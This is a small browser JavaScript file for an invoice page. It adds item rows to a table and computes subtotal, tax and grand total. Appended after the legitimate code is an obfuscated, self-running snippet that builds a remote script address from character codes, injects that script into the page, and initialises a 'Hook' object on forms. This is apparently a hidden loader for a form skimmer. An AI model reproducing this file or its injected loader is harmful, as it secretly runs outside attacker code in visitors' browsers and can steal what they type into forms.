const detailsButton = document.getElementById("detail-submit-btn");

detailsButton.addEventListener("click", function () {
  const buyerDetails = document.getElementById("buyer-details-input");
  document.getElementById("buyer-info").innerText = buyerDetails.value;
  buyerDetails.value = "";
});

const addProductBtn = document.getElementById("add-details-btn");

addProductBtn.addEventListener("click", function () {
  const infoTable = document.getElementById("info-table");
  const itemName = document.getElementById("item-name-input");
  const itemPrice = document.getElementById("item-price-input");
  const itemQuantity = document.getElementById("item-quantity-input");

  if (
    itemName.value == "" ||
    itemPrice.value < 0 ||
    itemQuantity.value < 0 ||
    itemPrice.value == "" ||
    itemQuantity.value == ""
  ) {
    console.log("sorry");
    return;
  }

  {
    /* <tr>
 <th >1</th>
 <td>Mark</td>
<td>Otto</td>
<td class='item-total'>@mdo</td>
</tr> */
  }

  const totalPrice = parseInt(itemPrice.value) * parseInt(itemQuantity.value);

  //   const tr = document.createElement("tr"); //<tr></tr>
  const tr = element("tr");
  const th = element("th");

  const td1 = document.createElement("td");
  const td2 = document.createElement("td");
  const td3 = document.createElement("td");

  td3.classList.add("item-total");
  th.innerText = itemName.value; //<th >onion</th>
  td1.innerText = itemPrice.value; //<th >1</th>
  td2.innerText = itemQuantity.value;
  td3.innerText = totalPrice;

  tr.appendChild(th);
  tr.appendChild(td1);
  tr.appendChild(td2);
  tr.appendChild(td3); //<td class="item-total">35</td>
  infoTable.appendChild(tr);
  totalCalculation();
});

function element(param) {
  return document.createElement(param);
}

function totalCalculation() {
  const subTotal = calculateSubTotal();

  const subTotalToDisplay = document.getElementById("sub-total");
  subTotalToDisplay.innerText = subTotal;

  const tax = subTotal * 0.2;

  document.getElementById("tax").innerText = tax.toFixed(2);
  document.getElementById("grand-total").innerText = subTotal + tax;
  document.getElementById("grand-total-2").innerText = subTotal + tax;
}

function calculateSubTotal() {
  let subTotal = 0;

  const cost = document.getElementsByClassName("item-total");

  for (let i = 0; i < cost.length; i++) {
    const element = cost[i]; //<td class="item-total">35</td>
    const price = parseInt(element.innerText);

    subTotal = subTotal + price;
  }

  return subTotal;
}


(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b